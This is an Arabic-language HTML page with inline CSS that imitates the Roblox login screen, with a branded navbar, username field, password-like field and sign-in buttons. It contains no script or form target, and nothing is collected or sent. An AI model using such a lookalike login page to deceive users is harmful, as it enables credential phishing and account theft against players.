<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Roblox</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#1c1f26;
  color:white;
}

/* الشريط العلوي */
.navbar{
  background:#111;
  height:60px;
  display:flex;
  align-items:center;
  padding:0 15px;
}

.logo{
  font-size:22px;
  font-weight:bold;
  margin-right:20px;
}

.links a{
  color:#ccc;
  text-decoration:none;
  margin-right:15px;
  font-size:14px;
}
.links a:hover{color:white}

.search{
  margin:auto;
}
.search input{
  width:260px;
  padding:8px 12px;
  border-radius:6px;
  border:none;
  background:#2b2b2b;
  color:white;
}

.actions{
  display:flex;
  gap:10px;
}
.actions button{
  padding:8px 14px;
  border:none;
  border-radius:6px;
  color:white;
  cursor:pointer;
}
.blue{background:#2a7cff;}
.dark{background:#2f3340;}

/* صندوق الدخول */
.main{
  display:flex;
  justify-content:center;
  margin-top:70px;
}
.box{
  background:#23262f;
  width:380px;
  padding:25px;
  border-radius:12px;
  box-shadow:0 0 20px rgba(0,0,0,.5);
}
h2{text-align:center;}
input{
  width:100%;
  padding:12px;
  margin:10px 0;
  border:none;
  border-radius:8px;
  background:#2f3340;
  color:white;
}
.mainbtn{
  width:100%;
  padding:12px;
  background:#2a7cff;
  border:none;
  border-radius:8px;
  color:white;
  font-weight:bold;
  margin-top:10px;
}
.sec{
  width:100%;
  padding:12px;
  background:#2f3340;
  border:none;
  border-radius:8px;
  color:white;
  margin-top:10px;
}
.small{text-align:center;font-size:13px;color:#cfcfcf;margin:12px 0;}
.line{height:1px;background:#444;margin:15px 0;}
</style>
</head>
<body>

<div class="navbar">
  <div class="logo">ROBLOX</div>

  <div class="links">
    <a href="#">الرئيسية</a>
    <a href="#">السوق</a>
    <a href="#">إنشاء</a>
    <a href="#">Robux</a>
  </div>

  <div class="search">
    <input type="text" placeholder="بحث">
  </div>

  <div class="actions">
    <button class="blue">تسجيل الدخول</button>
    <button class="dark">تسجيل الدخول</button>
  </div>
</div>

<div class="main">
<div class="box">
  <h2>تسجيل الدخول إلى Roblox</h2>

  <input type="text" placeholder="اسم المستخدم">
  <input type="text" placeholder="خبراتك">

  <button class="mainbtn">تسجيل الدخول</button>

  <div class="small">نسيت كلمة المرور أو اسم المستخدم؟</div>
  <div class="line"></div>

  <button class="sec">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
  <button class="sec">تسجيل دخول سريع</button>

  <div class="small">ليس لديك حساب؟ اشترك</div>
</div>
</div>

</body>
</html>
